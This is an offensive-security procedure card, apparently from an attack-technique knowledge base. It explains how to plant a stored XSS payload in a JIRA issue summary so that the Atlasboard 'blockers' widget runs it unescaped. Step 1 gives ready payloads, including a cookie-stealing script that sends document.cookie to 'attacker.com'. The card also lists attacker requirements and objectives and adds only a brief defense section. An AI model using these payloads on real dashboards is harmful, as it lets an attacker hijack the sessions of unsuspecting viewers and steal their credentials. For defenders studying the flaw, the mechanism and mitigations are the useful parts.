---
tags:
  - injection
  - xss
  - payload
type: procedure
tools:
  - JIRA
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:30.365Z'
sub_techniques: []
id: 77bac8a9-c185-4f85-aec2-1f857c2fe603
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-JIRA

## Summary

This procedure creates a JIRA issue with a malicious HTML/JavaScript payload in the summary field, exploiting the lack of sanitization in the Atlasboard 'blockers' widget to enable XSS execution.

## Description

Attackers with JIRA write access can embed scripts in issue summaries, which Atlasboard fetches and inserts via jQuery.append() without escaping. The payload executes in the viewer's browser context when the dashboard loads. Requires JIRA permissions; outcome is a persistent injection visible in queries.

## Requirements

1. Valid JIRA account with create/modify issue permissions
2. Knowledge of the target project for issue creation
3. Configured JQL that includes the new issue
4. Browser access to JIRA UI

## Defense

Defensive measures and detection strategies:

- Sanitize user inputs in issue trackers at the application level
- Implement Content Security Policy (CSP) on dashboards
- Monitor JIRA issues for suspicious HTML/JS patterns

## Objectives

1. Embed executable script in JIRA summary
2. Ensure payload matches the JQL filter
3. Verify injection without triggering JIRA sanitization

## Instructions

### Step 1: Create Malicious Issue

**Context**: Log into JIRA and create a new issue in the target project.

**Command** (UI Action):
Navigate to 'Create Issue' in JIRA.

> Set summary to 'test<script>alert(1)</script>' or similar payload (e.g., for cookie theft: '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'). Select project and issue type, then submit. Expected output: Issue created with ID, payload in summary.

### Step 2: Verify Issue Retrieval

**Context**: Confirm the issue appears in the dashboard's JQL results.

**Command** (JIRA Search):
Run the configured JQL in JIRA search.

> Expected output: New issue listed with payload intact as text.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- JIRA

## Tags

- [[injection]]
- [[xss]]
- [[payload]]
